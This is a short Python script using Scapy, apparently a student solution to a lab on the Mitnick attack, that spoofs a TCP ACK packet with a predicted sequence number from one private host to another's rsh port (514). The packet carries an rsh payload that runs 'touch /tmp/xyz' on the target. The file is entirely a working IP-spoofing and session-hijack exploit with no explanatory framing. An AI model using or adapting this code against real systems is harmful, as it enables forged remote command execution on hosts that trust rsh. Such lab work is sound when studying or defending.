# seq_prediction.py
from scapy.all import *

# Forging an ACK with predicted sequence number
jeytha_ip = IP(src="10.9.0.5", dst="10.9.0.6")
venktcp = TCP(sport=1023, dport=514, flags="A", seq=778933537, ack=399324157)
data = '9090\x00seed\x00dees\x00touch /tmp/xyz\x00'

if venktcp.flags == "A":
    print("Sending ACK packet with data payload to hijack session...")
    packet = jeytha_ip/venktcp/data
    send(packet, verbose=0)
